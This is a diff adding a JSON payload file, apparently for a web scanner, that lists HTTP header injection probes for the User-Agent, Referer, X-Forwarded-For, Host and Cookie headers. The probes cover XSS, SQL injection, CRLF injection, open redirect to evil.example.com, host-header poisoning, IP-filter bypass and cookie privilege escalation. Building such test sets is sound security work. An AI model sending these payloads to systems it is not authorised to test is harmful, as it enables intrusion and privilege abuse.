@@ -1,0 +1,29 @@
+{
+  "family": "headers",
+  "version": "1.0.0",
+  "categories": {
+    "user_agent": [
+      {"payload": "Mozilla/5.0 <script>alert(1)</script>",         "type": "xss",  "description": "XSS dans logs/analytics", "confidence_hint": 80},
+      {"payload": "Mozilla/5.0 ' OR 1=1-- ",                       "type": "sqli", "description": "SQLi dans UA stocké en DB", "confidence_hint": 75},
+      {"payload": "Mozilla/5.0\r\nX-Injected: yes",                "type": "crlf", "description": "CRLF injection", "confidence_hint": 70}
+    ],
+    "referer": [
+      {"payload": "javascript:alert(1)",                           "type": "xss",      "description": "XSS via Referer affiché", "confidence_hint": 70},
+      {"payload": "https://evil.example.com",                      "type": "redirect", "description": "Open redirect via referer", "confidence_hint": 60},
+      {"payload": "<script>alert(1)</script>",                     "type": "xss",      "description": "XSS dans logs/admin panel", "confidence_hint": 70}
+    ],
+    "x_forwarded_for": [
+      {"payload": "127.0.0.1",                                     "type": "ssrf",  "description": "Bypass IP filter", "confidence_hint": 70},
+      {"payload": "' OR 1=1-- ",                                   "type": "sqli",  "description": "SQLi via IP loggée en DB", "confidence_hint": 75},
+      {"payload": "<svg onload=alert(1)>",                         "type": "xss",   "description": "XSS dans logs admin", "confidence_hint": 70}
+    ],
+    "host": [
+      {"payload": "evil.example.com",                              "type": "host-injection", "description": "Host header injection (cache poisoning)", "confidence_hint": 75},
+      {"payload": "localhost",                                     "type": "host-injection", "description": "Bypass virtual host", "confidence_hint": 65}
+    ],
+    "cookie": [
+      {"payload": "admin=true",                                     "type": "privesc",      "description": "Tente d'élever privilèges via cookie deviné", "confidence_hint": 50},
+      {"payload": "role=admin",                                     "type": "privesc",      "description": "Idem", "confidence_hint": 50}
+    ]
+  }
+}
